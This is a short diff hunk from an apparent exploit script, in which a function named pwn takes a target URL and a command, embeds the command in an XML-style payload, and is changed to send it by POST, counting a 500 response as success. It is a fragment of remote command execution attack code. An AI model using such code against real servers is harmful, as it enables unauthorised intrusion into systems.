@@ -10,7 +10,7 @@ def pwn(url,cmd):
 	</map> 
 	'''.format(cmd=cmd)
 	try:
-		r = requests.get(url,data=data,headers=headers,timeout=5)
+		r = requests.post(url,data=data,headers=headers,timeout=5)
 		if r.status_code == 500:		
 			return 1			
 		else:
